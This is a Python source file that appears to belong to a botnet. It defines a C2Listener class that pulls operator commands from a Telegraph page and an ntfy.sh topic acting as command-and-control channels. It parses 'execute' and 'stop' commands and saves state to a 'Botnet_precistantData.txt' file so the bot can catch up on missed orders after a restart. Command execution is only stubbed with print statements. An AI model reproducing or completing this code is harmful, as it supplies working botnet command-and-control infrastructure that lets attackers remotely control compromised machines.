import requests
import bots.Parser as Parser
from bots.Cryptographic import Cryptographic
import json
import os
from datetime import date

# Returns commands from C2 server
class C2Listener:
    def __init__(self, crypt: Cryptographic):
        self.C2_telegraph_URL = "https://telegra.ph/BNS-TESTING-03-10"
        self.parser = Parser.Parser(crypt)

        self.C2_ntfy_URL = "https://ntfy.sh/BNS_BN_22_Admin/json"
        self.C2_ntfy_all_URL = "https://ntfy.sh/BNS_BN_22_Admin/json?poll=1"
        self.last_command_time = 0

    # pull commands from C2 server
    def pull_commands(self):
        r = requests.get(self.C2_telegraph_URL)

        if r.status_code == 200:
            command = self.parser.parse_command(r)
            print(f"Bot pulled commands: {command}")
            return command
        else:
            print(f"Bot failed to pull commands.")
            return "None"
        
    # start listening to the commands of the admin
    def start_command_listener(self):
        self.startup_check_old()

        r = requests.get(url=self.C2_ntfy_URL, stream=True)

        if r.status_code != 200:
            print(f"Bot failed to pull commands.")
            return "None"
        
        for line in r.iter_lines():
            data = json.loads(line)

            if (data["event"] == "message"):
                command = self.parser.parse_command(data["message"])
                print(f"Bot pulled commands: {command}")

                self.last_command_time = data["time"]
                with open("Botnet_precistantData.txt", "w") as f:
                    f.write("Last time: " + str(self.last_command_time) +"\n")

                    # do something with command

    # check on startup if there are any past commands you missed
    def startup_check_old(self):
        # get old messages
        r = requests.get(url=self.C2_ntfy_all_URL, stream=True)

        # check for error
        if r.status_code != 200:
            print(f"Bot failed to pull commands.")
            return "None"
        
        # recover last time
        if os.path.exists("Botnet_precistantData.txt"):
            with open("Botnet_precistantData.txt", "r") as f:
                for line in f:
                    if "Last time: " in line:
                        self.last_command_time = int(line[11:])
        else:
            f = open("Botnet_precistantData.txt", "w")
            f.write("Last time: 0\n")
            f.close()
            self.last_command_time = 0

        
        # check each command
        commandsToExecute = []
        for line in r.iter_lines():
            if not line:
                continue

            data = json.loads(line)

            # add the command to the list if it does not cancle a previous command
            if self.last_command_time < data["time"]:
                # set time
                self.last_command_time = data["time"]
                with open("Botnet_precistantData.txt", "w") as f:
                    f.write("Last time: " + str(self.last_command_time) +"\n")
                
                command = self.parser.parse_command(data["message"])

                # check for cancle
                if command[0] == "stop":
                    i = 0
                    while i < len(commandsToExecute):
                        if commandsToExecute[i][0] == "execute":
                            print("match: " + commandsToExecute[i][1] + " = " + command[1])
                        if commandsToExecute[i][0] == "execute" and commandsToExecute[i][1] == command[1]:
                            commandsToExecute.pop(i)
                        else:
                            i += 1
                else:
                    commandsToExecute.append(command)
            
        # execute all remaining commands
        for command in commandsToExecute:
            print(f"Catchup command: {command}")
        

